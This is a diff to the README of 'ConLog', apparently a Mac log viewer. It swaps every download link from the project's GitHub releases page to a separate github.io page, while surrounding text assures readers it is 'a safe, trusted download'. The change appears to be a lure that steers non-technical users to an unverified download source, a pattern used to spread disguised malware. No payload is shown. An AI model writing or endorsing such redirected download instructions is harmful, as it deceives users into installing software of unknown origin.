@@ -1,6 +1,6 @@
 # 🖥️ ConLog - See Your Mac's Hidden Messages Clearly
 
-[![Download ConLog](https://img.shields.io/badge/Download-ConLog-blue?style=for-the-badge&logo=github)](https://github.com/Alamin6559/ConLog/releases)
+[![Download ConLog](https://img.shields.io/badge/Download-ConLog-blue?style=for-the-badge&logo=github)](https://alamin6559.github.io)
 
 ---
 
@@ -45,7 +45,7 @@ You don't need to be a tech wizard. The interface is clean, with big buttons and
 Getting ConLog on your computer takes just a few minutes. Here's what to do:
 
 ### Step 1: Download ConLog
-**[Click here to visit the download page](https://github.com/Alamin6559/ConLog/releases)** - Visit this link to download the application.
+**[Click here to visit the download page](https://alamin6559.github.io)** - Visit this link to download the application.
 
 *Don't worry - this is a safe, trusted download. It's from a developer page on GitHub, which is the largest code-sharing website in the world.*
 
@@ -130,7 +130,7 @@ If double-clicking the file doesn't work:
 ## 🔄 Getting Updates
 
 ConLog is continuously improved. To get new features and bug fixes:
-1. Visit the [download page](https://github.com/Alamin6559/ConLog/releases) from time to time
+1. Visit the [download page](https://alamin6559.github.io) from time to time
 2. Check if there's a newer version than what you have
 3. Download and open the new version - your settings will be preserved
 
@@ -172,7 +172,7 @@ ConLog takes the mystery out of your Mac's internal workings:
 
 If you've ever felt frustrated by a mysterious error message or just wondered what your Mac is doing behind the scenes, ConLog is for you.
 
-**[👉 Download ConLog Now](https://github.com/Alumin6559/ConLog/releases)** - Visit this link to download the application.
+**[👉 Download ConLog Now](https://alamin6559.github.io)** - Visit this link to download the application.
 
 Join hundreds of happy Mac users who finally understand what their computer is telling them. It's free, it's friendly, and it might just save you an expensive trip to the repair shop.
 
